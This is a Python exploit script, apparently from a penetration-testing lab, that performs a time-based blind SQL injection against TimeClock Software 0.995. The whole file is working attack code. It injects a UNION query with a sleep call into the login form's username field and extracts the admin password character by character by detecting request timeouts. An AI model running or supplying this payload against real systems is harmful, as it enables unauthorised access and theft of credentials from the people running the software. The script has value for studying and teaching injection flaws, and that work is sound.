#!/usr/bin/env python
#
# Time-based blind SQL injection for TimeClock Sofware
# Based on TimeClock Software 0.995 - Multiple SQL Injections
# https://www.exploit-db.com/exploits/39404/
#
# Usage: timeclock.py <Host> <Port>
#
 
import requests, string, sys
 
query = "' union SELECT * from user_info WHERE username = 'admin' and substr(password, %d, 1) = binary '%s' and sleep(2) -- "
chars = string.ascii_letters + '0123456789'

host = sys.argv[1]
port = sys.argv[2]
 
print("Running!")

for i in range(1, 100):
    found = False
    for c in chars:
        try:
            requests.post("http://" + host + ":" + port + "/index.php",data={"username": query % (i, c), "password": "pass", "submit": "Log In"}, timeout=1)
        except requests.exceptions.Timeout:
            sys.stdout.write(c)
	    sys.stdout.flush()
            found = True
            break
    if not found:
        break
 
print("\nDone! Try Harder!")
